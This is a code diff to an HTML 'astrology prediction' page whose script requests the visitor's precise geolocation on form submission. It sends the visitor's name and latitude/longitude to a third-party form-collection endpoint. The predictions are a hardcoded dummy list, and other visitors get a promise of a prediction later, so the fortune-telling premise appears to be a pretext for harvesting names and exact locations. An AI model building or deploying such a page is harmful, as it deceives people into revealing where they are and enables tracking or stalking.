@@ -100,52 +100,53 @@
     <div id="result"></div>
   </div>
 
-  <script>
-    // Dummy prediction list
-    const predictionData = {
-      "Rahul Sharma": "You are full of energy today. A surprise is waiting for you!",
-      "Priya Das": "Your calm nature will help you win a small conflict this week.",
-      "Ajay Kumar": "You may receive good news related to career growth."
-    };
+ <script>
+  const predictionData = {
+    "Rahul Sharma": "You are full of energy today. A surprise is waiting for you!",
+    "Priya Das": "Your calm nature will help you win a small conflict this week.",
+    "Ajay Kumar": "You may receive good news related to career growth."
+  };
 
-    // Get location if allowed
-    window.onload = () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            const loc = `Lat: ${position.coords.latitude}, Long: ${position.coords.longitude}`;
-            document.getElementById('location').value = loc;
-          },
-          (err) => {
-            alert("Please allow location access to use this feature.");
-          }
-        );
-      } else {
-        alert("Geolocation is not supported in your browser.");
-      }
-    };
+  document.getElementById('astroForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const form = e.target;
+    const name = form.name.value.trim();
+    const result = document.getElementById("result");
 
-    document.getElementById('astroForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-      const form = e.target;
-      const name = form.name.value.trim();
-      const result = document.getElementById("result");
+    // Request location at the time of submission
+    const locationField = document.getElementById("location");
+    if (navigator.geolocation) {
+      try {
+        const position = await new Promise((resolve, reject) =>
+          navigator.geolocation.getCurrentPosition(resolve, reject)
+        );
+        const loc = `Lat: ${position.coords.latitude}, Long: ${position.coords.longitude}`;
+        locationField.value = loc;
+      } catch (error) {
+        alert("Location access denied or unavailable. We’ll continue without it.");
+        locationField.value = "Permission denied or unavailable";
+      }
+    } else {
+      alert("Geolocation not supported in your browser.");
+      locationField.value = "Not supported";
+    }
 
-      // Show prediction if name exists
-      if (predictionData[name]) {
-        result.innerText = predictionData[name];
-      } else {
-        result.innerText = "Thank you! We will notify you with your prediction soon.";
-      }
+    // Show prediction if name exists
+    if (predictionData[name]) {
+      result.innerText = predictionData[name];
+    } else {
+      result.innerText = "Thank you! We will notify you with your prediction soon.";
+    }
 
-      // Send form to Getform
-      const formData = new FormData(form);
-      fetch("https://getform.io/f/allyroma", {
-        method: "POST",
-        body: formData
-      });
-    });
+    // Send form to Getform
+    const formData = new FormData(form);
+    fetch("https://getform.io/f/allyroma", {
+      method: "POST",
+      body: formData
+    });
+  });
   </script>
+
 
 </body>
 </html>
